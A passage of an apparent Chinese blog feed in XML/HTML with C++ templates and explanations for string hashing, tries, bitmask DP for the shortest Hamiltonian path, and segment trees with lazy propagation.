class="hljs-keyword">return</span> h[r] - h[l - <span class="hljs-number">1</span>] * p[r - l + <span class="hljs-number">1</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>例题（模板题）：<br><a href="https://www.acwing.com/problem/content/submission/843/">https://www.acwing.com/problem/content/submission/843/</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>,P=<span class="hljs-number">131</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> ull;<br>ull h[N],p[N];<br>string s;<br><span class="hljs-function">ull <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-type">int</span> l,<span class="hljs-type">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> h[r]-h[l<span class="hljs-number">-1</span>]*p[r-l+<span class="hljs-number">1</span>];<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,m;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);<br>    cin&gt;&gt;s;<br>    s = <span class="hljs-string">&quot;0&quot;</span>+s;<br>    p[<span class="hljs-number">0</span>] =<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>    &#123;<br>        p[i] = p[i<span class="hljs-number">-1</span>]*P;<br>        h[i]  = h[i<span class="hljs-number">-1</span>]*P +s[i];<br>    &#125;<br>    <span class="hljs-type">int</span> l1,r1,l2,r2;<br>    <span class="hljs-keyword">while</span>(m--)<br>    &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d%d%d&quot;</span>,&amp;l1,&amp;r1,&amp;l2,&amp;r2);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">get</span>(l1,r1)==<span class="hljs-built_in">get</span>(l2,r2))<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Yes\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No\n&quot;</span>);<br>        &#125;<br>    &#125;<br>     <br>    <br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>字典树tried</title>
    <link href="/2022/12/30/%E5%AD%97%E5%85%B8%E6%A0%91Trie/"/>
    <url>/2022/12/30/%E5%AD%97%E5%85%B8%E6%A0%91Trie/</url>
    
    <content type="html"><![CDATA[<p>又称单词查找树，Trie树，是一种树形结构，是一种哈希树的变种。典型应用是用于统计，排序和保存大量的字符串（但不仅限于字符串），所以经常被搜索引擎系统用于文本词频统计。它的优点是：利用字符串的公共前缀来减少查询时间，最大限度地减少无谓的字符串比较，查询效率比哈希树高。</p><p>字符串统计：<br>模板：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> son[N][<span class="hljs-number">26</span>];<span class="hljs-comment">//存储节点，的下一个节点的下标。</span><br><span class="hljs-type">int</span> idx;<br><span class="hljs-type">int</span> cnt[N];<span class="hljs-comment">//存储有几个以该节点为结尾的字符串。</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(string x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> p = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;x.<span class="hljs-built_in">length</span>();i++)<br>    &#123;<br>        <span class="hljs-type">int</span> u = x[i]-<span class="hljs-string">&#x27;0&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(!son[p][u]) son[p][u] = ++idx;<span class="hljs-comment">//如果节点为空，则新建节点。</span><br>        p = son[p][u];<br>    &#125;<br>    cnt[p]++;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">query</span><span class="hljs-params">(string x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> p=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;x.<span class="hljs-built_in">length</span>();i++)<br>    &#123;<br>        <span class="hljs-type">int</span> u=x[i]-<span class="hljs-string">&#x27;0&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(!son[p][u]) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        p = son[p][u];<br>    &#125;<br>    <span class="hljs-keyword">return</span> cnt[p];<br>    <br></code></pre></td></tr></table></figure><p>最大异或对：<br>采用贪心的思想，对于一个数，从最高位找与它相反的位。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> p =<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">30</span>;i&gt;=<span class="hljs-number">0</span>;i--)<br>    &#123;<br>        <span class="hljs-type">int</span> &amp;s = son[p][(x&gt;&gt;i)&amp;<span class="hljs-number">1</span>];<span class="hljs-comment">//对每一位挨个存储。</span><br>        <span class="hljs-keyword">if</span>(!s) s = ++idx;<br>        p = s;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">option</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> res= <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> p =<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">30</span>;i&gt;=<span class="hljs-number">0</span>;i--)<br>    &#123;<br>        <span class="hljs-type">int</span> s = (x&gt;&gt;i)&amp;<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span>(son[p][!s])<span class="hljs-comment">//如果存在相反的位，那么就朝相反的位移动。</span><br>        &#123;<br>            res += <span class="hljs-number">1</span>&lt;&lt;i;<br>            p = son[p][!s];<br>        &#125;<br>        <span class="hljs-keyword">else</span> p = son[p][s];<br>        <br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>状态压缩dp</title>
    <link href="/2022/12/30/%E7%8A%B6%E6%80%81%E5%8E%8B%E7%BC%A9dp/"/>
    <url>/2022/12/30/%E7%8A%B6%E6%80%81%E5%8E%8B%E7%BC%A9dp/</url>
    
    <content type="html"><![CDATA[<p>状态压缩，用二进制数来表示状态，从而达到状态转移的目的。<br>例题,最短哈密尔顿路径。<br><a href="https://www.acwing.com/problem/content/93/">https://www.acwing.com/problem/content/93/</a><br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">20</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> M = <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">20</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> inf  = INT_MAX/<span class="hljs-number">2</span>;<br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> dp[M][N];<span class="hljs-comment">//状态为i，结尾为点j</span><br><span class="hljs-type">int</span> gra[N][N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)<br>        &#123;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;gra[i][j]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">memset</span>(dp,<span class="hljs-number">0x3f</span>,<span class="hljs-keyword">sizeof</span> dp);<br>    dp[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]=<span class="hljs-number">0</span>;<span class="hljs-comment">//起点为1，没走过任何路程</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">1</span>&lt;&lt;n;i++)<span class="hljs-comment">//枚举所有状态</span><br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)<span class="hljs-comment">//枚举所有结尾的点。</span><br>        &#123;<br>            <span class="hljs-keyword">if</span>((i&gt;&gt;j) &amp;<span class="hljs-number">1</span>)<span class="hljs-comment">//状态i里面有j点，可以进行转移。</span><br>            &#123;<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;k&lt;n;k++)<span class="hljs-comment">//枚举转移点k</span><br>                &#123;<br>                    <span class="hljs-keyword">if</span>(((i-(<span class="hljs-number">1</span>&lt;&lt;j))&gt;&gt;k) &amp; <span class="hljs-number">1</span> )<span class="hljs-comment">//状态i必须包含转移点k</span><br>                    &#123;<br>                        dp[i][j] = <span class="hljs-built_in">min</span>(dp[i][j],dp[i-(<span class="hljs-number">1</span>&lt;&lt;j)][k]+gra[k][j]);<br>                        <span class="hljs-comment">//cout&lt;&lt;dp[i][j]&lt;&lt;&quot; &quot;;</span><br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,dp[(<span class="hljs-number">1</span>&lt;&lt;n)<span class="hljs-number">-1</span>][n<span class="hljs-number">-1</span>]);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>线段树</title>
    <link href="/2022/12/30/%E7%BA%BF%E6%AE%B5%E6%A0%91/"/>
    <url>/2022/12/30/%E7%BA%BF%E6%AE%B5%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<p>线段树是算法竞赛中常用的用来维护区间信息的数据结构。<br>线段树可以在O(logn)的时间复杂度内实现单点修改、区间修改、区间查询（区间求和，求区间最大值，求区间最小值）等操作。</p><h3 id="线段树的基本结构与建树"><a href="#线段树的基本结构与建树" class="headerlink" title="线段树的基本结构与建树"></a>线段树的基本结构与建树</h3><p>线段树将每个长度不为1的区间划分成左右两个区间递归求解，把整个线段划分为一个树形结构，通过合并左右两区间信息来求得该区间的信息。这种数据结构可以方便的进行大部分的区间操作。<br><img src="/upload/2022/04/image-ae22bd3e8862442082550e802ace4d1c.png" alt="image.png"><br>上图即为将[1,13]区间划分出来的线段树。树上每一个节点维护的是这个区间上的总和。<br>由树的性质，节点d[i]的左孩子为d[2i],则右孩子为d[2i+1]。<br>由此，若d[i]表示的为区间[s,t]那么，其左孩子表示的为区间[s,(s+t)&#x2F;2]<br>其右孩子表示的为[(s+t)&#x2F;2+1,t]<br>由此可进行建树：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// C++ Version</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">build</span><span class="hljs-params">(<span class="hljs-type">int</span> s, <span class="hljs-type">int</span> t, <span class="hljs-type">int</span> p)</span> </span>&#123;<br>  <span class="hljs-comment">// 对 [s,t] 区间建立线段树,当前根的编号为 p</span><br>  <span class="hljs-keyword">if</span> (s == t) &#123;<br>    d[p] = a[s];<span class="hljs-comment">//a[i]为原数组。</span><br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-type">int</span> m = s + ((t - s) &gt;&gt; <span class="hljs-number">1</span>);<br>  <span class="hljs-comment">// 移位运算符的优先级小于加减法，所以加上括号</span><br>  <span class="hljs-comment">// 如果写成 (s + t) &gt;&gt; 1 可能会超出 int 范围</span><br>  <span class="hljs-built_in">build</span>(s, m, p * <span class="hljs-number">2</span>), <span class="hljs-built_in">build</span>(m + <span class="hljs-number">1</span>, t, p * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>);<br>  <span class="hljs-comment">// 递归对左右区间建树</span><br>  d[p] = d[p * <span class="hljs-number">2</span>] + d[(p * <span class="hljs-number">2</span>) + <span class="hljs-number">1</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>有线段树的空间性质，若有n个节点，那么需要的空间的大小为4n。</p><h3 id="线段树的区间查询"><a href="#线段树的区间查询" class="headerlink" title="线段树的区间查询"></a>线段树的区间查询</h3><p>查询操作包括查询[l,r]区间的总和，求区间的最大值或最小值。<br>以上述的图为例，若查询区间[1,13]的和，直接返回d[1]的值即可。<br>若求区间[1,6]的和，那么需要将[1,4],[5,6]两个进行合并。<br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// C++ Version</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getsum</span><span class="hljs-params">(<span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r, <span class="hljs-type">int</span> s, <span class="hljs-type">int</span> t, <span class="hljs-type">int</span> p)</span> </span>&#123;<br>  <span class="hljs-comment">// [l, r] 为查询区间, [s, t] 为当前节点包含的区间, p 为当前节点的编号</span><br>  <span class="hljs-keyword">if</span> (l &lt;= s &amp;&amp; t &lt;= r)<br>    <span class="hljs-keyword">return</span> d[p];  <span class="hljs-comment">// 当前区间为询问区间的子集时直接返回当前区间的和</span><br>  <span class="hljs-type">int</span> m = s + ((t - s) &gt;&gt; <span class="hljs-number">1</span>), sum = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> (l &lt;= m) sum += <span class="hljs-built_in">getsum</span>(l, r, s, m, p * <span class="hljs-number">2</span>);<br>  <span class="hljs-comment">// 如果左儿子代表的区间 [l, m] 与询问区间有交集, 则递归查询左儿子</span><br>  <span class="hljs-keyword">if</span> (r &gt; m) sum += <span class="hljs-built_in">getsum</span>(l, r, m + <span class="hljs-number">1</span>, t, p * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>);<br>  <span class="hljs-comment">// 如果右儿子代表的区间 [m + 1, r] 与询问区间有交集, 则递归查询右儿子</span><br>  <span class="hljs-keyword">return</span> sum;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="线段树的区间修改与懒惰标记"><a href="#线段树的区间修改与懒惰标记" class="headerlink" title="线段树的区间修改与懒惰标记"></a>线段树的区间修改与懒惰标记</h3><p>如果要求修改区间[l,r]，那么把包含区间[l,r]的节点全部修改一次的复杂度不能接受，由此引入懒惰标记。<br>懒惰标记，简单来说，就是通过延迟对节点信息的更改，从而减少可能不必要的操作次数。每次执行修改时，我们通过打标记的方法表明该节点对应的区间在某一次操作中被更改，但不更新该节点的子节点的信息。实质性的修改则在下一次访问带有标记的节点时才进行。<br>区间修改：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// C++ Version</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">update</span><span class="hljs-params">(<span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r, <span class="hljs-type">int</span> c, <span class="hljs-type">int</span> s, <span class="hljs-type">int</span> t, <span class="hljs-type">int</span> p)</span> </span>&#123;<br>  <span class="hljs-comment">// [l, r] 为修改区间, c 为被修改的元素的变化量, [s, t] 为当前节点包含的区间, p</span><br>  <span class="hljs-comment">// 为当前节点的编号</span><br>  <span class="hljs-keyword">if</span> (l &lt;= s &amp;&amp; t &lt;= r) &#123;<br>    d[p] += (t - s + <span class="hljs-number">1</span>) * c, b[p] += c;<br>    <span class="hljs-keyword">return</span>;<br>  &#125;  <span class="hljs-comment">// 当前区间为修改区间的子集时直接修改当前节点的值,然后打标记,结束修改</span><br>  <span class="hljs-type">int</span> m = s + ((t - s) &gt;&gt; <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">if</span> (b[p] &amp;&amp; s != t) &#123;<br>    <span class="hljs-comment">// 如果当前节点的懒标记非空,则更新当前节点两个子节点的值和懒标记值</span><br>    d[p * <span class="hljs-number">2</span>] += b[p] * (m - s + <span class="hljs-number">1</span>), d[p * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>] += b[p] * (t - m);<br>    b[p * <span class="hljs-number">2</span>] += b[p], b[p * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>] += b[p];  <span class="hljs-comment">// 将标记下传给子节点</span><br>    b[p] = <span class="hljs-number">0</span>;                                <span class="hljs-comment">// 清空当前节点的标记</span><br>  &#125;<br>  <span class="hljs-keyword">if</span> (l &lt;= m) <span class="hljs-built_in">update</span>(l, r, c, s, m, p * <span class="hljs-number">2</span>);<br>  <span class="hljs-keyword">if</span> (r &gt; m) <span class="hljs-built_in">update</span>(l, r, c, m + <span class="hljs-number">1</span>, t, p * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>);<br>  d[p] = d[p * <span class="hljs-number">2</span>] + d[p * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>区间查询（区间求和）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// C++ Version</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getsum</span><span class="hljs-params">(<span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r, <span class="hljs-type">int</span> s, <span class="hljs-type">int</span> t, <span class="hljs-type">int</span> p)</span> </span>&#123;<br>  <span class="hljs-comment">// [l, r] 为查询区间, [s, t] 为当前节点包含的区间, p 为当前节点的编号</span><br>  <span class="hljs-keyword">if</span> (l &lt;= s &amp;&amp; t &lt;= r) <span class="hljs-keyword">return</span> d[p];<br>  <span class="hljs-comment">// 当前区间为询问区间的子集时直接返回当前区间的和</span><br>  <span class="hljs-type">int</span> m = s + ((t - s) &gt;&gt; <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">if</span> (b[p]) &#123;<br>    <span class="hljs-comment">// 如果当前节点的懒标记非空,则更新当前节点两个子节点的值和懒标记值</span><br>    d[p * <span class="hljs-number">2</span>] += b[p] * (m - s + <span class="hljs-number">1</span>), d[p * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>] += b[p] * (t - m),<br>        b[p * <span class="hljs-number">2</span>] += b[p], b[p * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>] += b[p];  <span class="hljs-comment">// 将标记下传给子节点</span><br>    b[p] = <span class="hljs-number">0</span>;                                    <span class="hljs-comment">// 清空当前节点的标记</span><br>  &#125;<br>  <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> (l &lt;= m) sum = <span class="hljs-built_in">getsum</span>(l, r, s, m, p * <span class="hljs-number">2</span>);<br>  <span class="hljs-keyword">if</span> (r &gt; m) sum += <span class="hljs-built_in">getsum</span>(l, r, m + <span class="hljs-number">1</span>, t, p * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">return</span> sum;<br>&#125;<br></code></pre></td></tr></table></figure><p>区间修改为某一个值：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// C++ Version</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">update</span><span class="hljs-params">(<span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r, <span class="hljs-type">int</span> c, <span class="hljs-type">int</span> s, <span class="hljs-type">int</span> t, <span class="hljs-type">int</span> p)</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (l &lt;= s &amp;&amp; t &lt;= r) &#123;<br>    d[p] = (t - s + <span class="hljs-number">1</span>) * c, b[p] = c;<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-type">int</span> m = s + ((t - s) &gt;&gt; <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">if</span> (b[p]) &#123;<br>    d[p * <span class="hljs-number">2</span>] = b[p] * (m - s + <span class="hljs-number">1</span>), d[p * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>] = b[p] * (t - m),<br>          b[p * <span class="hljs-number">2</span>] = b[p * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>] = b[p];<br>    b[p] = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (l &lt;= m) <span class="hljs-built_in">update</span>(l, r, c, s, m, p * <span class="hljs-number">2</span>);<br>  <span class="hljs-keyword">if</span> (r &gt; m) <span class="hljs-built_in">update</span>(l, r, c, m + <span class="hljs-number">1</span>, t, p * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>);<br>  d[p] = d[p * <span class="hljs-number">2</span>] + d[p * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getsum</span><span class="hljs-params">(<span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r, <span class="hljs-type">int</span> s, <span class="hljs-type">int</span> t, <span class="hljs-type">int</span> p)</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (l &lt;= s &amp;&amp; t &lt;= r) <span class="hljs-keyword">return</span> d[p];<br>  <span class="hljs-type">int</span> m = s + ((t - s) &gt;&gt; <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">if</span> (b[p]) &#123;<br>    d[p * <span class="hljs-number">2</span>] = b[p] * (m - s + <span class="hljs-number">1</span>), d[p * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>] = b[p] * (t - m),<br>          b[p * <span class="hljs-number">2</span>] = b[p * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>] = b[p];<br>    b[p] = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> (l &lt;= m) sum = <span class="hljs-built_in">getsum</span>(l, r, s, m, p * <span class="hljs-number">2</span>);<br>  <span class="hljs-keyword">if</span> (r &gt; m) sum += <span class="hljs-built_in">getsum</span>(l, r, m + <span class="hljs-number">1</span>, t, p * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">return</span> sum;<br>&#125;<br></code></pre></td></tr></table></figure><p>拓展猫树等：<a href="https://oi-wiki.org/ds/seg/">https://oi-wiki.org/ds/seg/</a></p>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>拓展欧几里德</title>
    <link href="/2022/12/30/%E6%8B%93%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95/"/>
    <url>/2022/12/30/%E6%8B%93%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95/</url>
    
